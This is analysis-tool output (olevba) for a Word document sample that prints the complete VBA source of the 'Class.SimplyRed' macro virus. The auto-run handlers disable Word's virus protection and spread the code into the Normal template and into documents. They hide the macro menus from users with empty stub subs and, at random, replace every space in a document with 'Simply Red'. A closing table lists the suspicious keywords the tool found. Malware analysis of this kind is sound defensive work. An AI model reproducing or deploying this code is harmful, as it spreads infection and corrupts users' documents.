olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden-4ea0548d29efa517a974b875c86def75419f2c20
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden-4ea0548d29efa517a974b875c86def75419f2c20 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
End Sub

Private Sub Document_New()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")

End If
Phuck:
End Sub





Private Sub Document_Open()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set stlth = ActiveDocument.VBProject
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
Set stlth = NormalTemplate.VBProject
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
cnt = stlth.VBComponents.Count
If cnt <> 0 Then
For i = 1 To cnt
aprj = stlth.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
Else
already = False
End If
If Not already Then
stlth.VBComponents.Add (vbext_ct_StdModule)
stlth.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = stlth.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")

End If
Phuck:
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

